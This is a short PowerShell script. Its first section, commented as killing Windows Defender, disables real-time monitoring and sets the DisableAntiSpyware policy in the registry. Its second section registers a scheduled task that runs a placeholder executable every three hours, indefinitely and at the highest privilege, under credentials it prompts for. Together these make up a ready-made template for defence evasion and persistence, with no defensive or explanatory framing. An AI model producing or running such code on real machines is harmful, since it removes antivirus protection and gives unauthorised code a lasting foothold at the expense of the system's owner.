##KILLS WINDOWS DEFENDER
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force


###CREATES A SCHEDULE TASK
$jobname = "ENTER JOB NAMW"
$script =  "ENTER ARGUMENT"
$action = New-ScheduledTaskAction –Execute "ENTER PATH TO SCRIPT OR EXE" -Argument  "$script"
$duration = ([timeSpan]::maxvalue)
$repeat = (New-TimeSpan -hours 3) #### RUNS EVERY X HOURS
$trigger =New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat -RepetitionDuration $duration

 
$msg = "Enter the username and password that will run the task"; 
$credential = $Host.UI.PromptForCredential("Task username and password",$msg,"$env:userdomain\$env:username",$env:userdomain)
$username = $credential.UserName
$password = $credential.GetNetworkCredential().Password
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
 Register-ScheduledTask -TaskName $jobname -Action $action -Trigger $trigger -RunLevel Highest -User $username -Password $password -Settings $settings